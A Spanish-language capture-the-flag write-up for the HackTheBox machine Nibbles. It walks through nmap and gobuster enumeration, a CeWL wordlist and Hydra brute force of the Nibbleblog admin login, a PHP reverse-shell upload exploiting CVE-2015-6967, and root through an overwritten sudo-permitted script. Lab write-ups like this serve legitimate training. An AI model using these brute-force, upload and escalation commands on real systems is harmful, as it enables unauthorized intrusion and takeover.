# Nibbles — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Nibbles](https://app.hackthebox.com/machines/Nibbles) |
| **Plataforma** | [HackTheBox](https://app.hackthebox.com/) |
| **Sistema Operativo** | Linux (Ubuntu) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se lanza un escaneo completo con Nmap para descubrir servicios activos:

```bash
nmap -p- -sCV -T5 --open -vvv -oN Nibbles 10.129.96.84
```

![Nmap Scan](images/01_nmap_scan.jpg)

Puertos abiertos:
- **Puerto 22** — SSH (OpenSSH 7.2p2, Ubuntu)
- **Puerto 80** — HTTP (Apache 2.4.18, Ubuntu)

---

## Enumeración Web

Al acceder al puerto 80 desde el navegador se muestra una página con el texto "Hello world!":

![Web Home](images/02_web_home.jpg)

### Análisis del código fuente

Se inspecciona el código fuente de la página. Se encuentra un comentario HTML que revela la existencia de un directorio oculto:

```html
<!--/nibbleblog/ directory. Nothing interesting here!-->
```

![Source Comment](images/03_source_comment.jpg)

Al navegar a `/nibbleblog/` se muestra un blog llamado **Nibbles Yum yum**:

![Nibbleblog](images/04_nibbleblog.jpg)

### Fuzzing de directorios

Se lanza **Gobuster** sobre `/nibbleblog/` para descubrir rutas adicionales:

```bash
gobuster dir -u http://10.129.96.84/nibbleblog/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,xml
```

![Gobuster](images/05_gobuster.jpg)

Se descubren rutas relevantes: `/admin.php`, `/content`, `/plugins`, entre otras.

### Exploración del directorio /content

Al acceder a `/nibbleblog/content/` se muestra un índice de directorios:

![Content Index](images/06_content_index.jpg)

Explorando la ruta `/nibbleblog/content/private/users.xml` se obtiene el nombre de usuario del administrador: **admin**:

![Users XML](images/07_users_xml.jpg)

---

## Acceso al Panel de Administración

### Análisis del formulario de login

Se inspecciona el panel de administración en `/nibbleblog/admin.php` con curl para confirmar su estructura:

```bash
curl -s http://10.129.96.84/nibbleblog/admin.php
```

![Admin PHP](images/08_admin_php.jpg)

Se prueba un login con credenciales incorrectas para confirmar el mensaje de error que usará Hydra:

```bash
curl -i -s -X POST \
  -d "username=admin&password=prueba" \
  http://10.129.96.84/nibbleblog/admin.php
```

![Login Failed](images/09_login_failed.jpg)

El mensaje de error es: `Incorrect username or password`.

### Generación de diccionario con CeWL

Se genera un diccionario personalizado a partir del contenido del blog con **CeWL**:

```bash
cewl --lowercase http://10.129.96.84/nibbleblog/ -w diccionario_Nibbles.txt
```

![CeWL](images/10_cewl.jpg)

El diccionario generado contiene palabras extraídas del sitio:

![Diccionario](images/11_diccionario.jpg)

### Fuerza bruta con Hydra

Se lanza un ataque de fuerza bruta sobre el panel de administración con **Hydra**:

```bash
hydra -l admin \
  -P /home/kali/Escritorio/HTB/Nibbles/diccionario_Nibbles.txt \
  10.129.96.84 \
  http-post-form \
  "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password"
```

![Hydra](images/12_hydra.jpg)

Credenciales encontradas: **admin : nibbles**

### Acceso al dashboard

Se accede al panel de administración con las credenciales obtenidas:

![Dashboard](images/13_dashboard.jpg)

---

## Explotación — File Upload RCE (CVE-2015-6967)

### Investigación de la vulnerabilidad

Se investiga la versión de Nibbleblog y se encuentra la vulnerabilidad **CVE-2015-6967**: el plugin *My image* permite subir archivos sin restricción de extensión, lo que posibilita la ejecución de código arbitrario subiendo un archivo PHP directamente accesible en `content/private/plugins/my_image/image.php`:

![CVE](images/14_cve.jpg)

### Localización del plugin My image

En el panel de administración, en la sección **Plugins**, se localiza el plugin **My image**:

![Plugins](images/15_plugins.jpg)

### Subida de la reverse shell

Se genera una reverse shell en PHP y se sube a través del plugin My image haciendo clic en **Configure**:

![Upload Shell](images/16_upload_shell.jpg)

Antes de activar la shell, se levanta un listener con Netcat en la máquina atacante:

```bash
nc -lvnp 9001
```

Se navega a la ruta donde se almacena el archivo subido para ejecutarlo:

```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
```

![Image PHP](images/17_image_php.jpg)

Se obtiene una shell como el usuario **nibbler**:

![Shell Nibbler](images/18_shell_nibbler.jpg)

### Flag de usuario

```bash
cd /home
cd nibbler
ls
cat user.txt
```

![User Flag](images/19_user_flag.jpg)

---

## Escalada de Privilegios

### Enumeración de permisos sudo

Se comprueba qué puede ejecutar `nibbler` con privilegios elevados:

```bash
sudo -l
```

![Sudo -l](images/20_sudo_l.jpg)

```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

El usuario puede ejecutar **monitor.sh** como root sin contraseña. El fichero aún no existe — está comprimido en `personal.zip`.

### Descompresión de personal.zip

```bash
ls
unzip personal.zip
ls
cd personal/stuff/
ls
```

![Unzip](images/21_unzip.jpg)

Se confirma que `monitor.sh` existe tras descomprimir el zip.

### Modificación de monitor.sh

Se sobreescribe `monitor.sh` con un payload que lanza una bash como root:

```bash
echo -e '#!/bin/bash\nexec /bin/bash -i' > monitor.sh
cat monitor.sh
```

![Monitor SH](images/22_monitor_sh.jpg)

### Ejecución y escalada

Se ejecuta el script con sudo:

```bash
sudo ./monitor.sh
```

![Root Shell](images/23_root_shell.jpg)

Se obtiene una shell como **root**.

### Flag de root

```bash
cd /root
ls
cat root.txt
```

![Root Flag](images/24_root_flag.jpg)

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Enumeración web | Fuzzing de directorios | `gobuster` |
| Enumeración web | Inspección de código fuente | Navegador |
| Enumeración web | Lectura de ficheros expuestos | Navegador |
| Obtención de credenciales | Generación de diccionario + fuerza bruta | `cewl` + `hydra` |
| Explotación | File Upload sin restricciones (CVE-2015-6967) | Navegador / `nc` |
| Escalada | Sobreescritura de script con permiso sudo | `bash` |
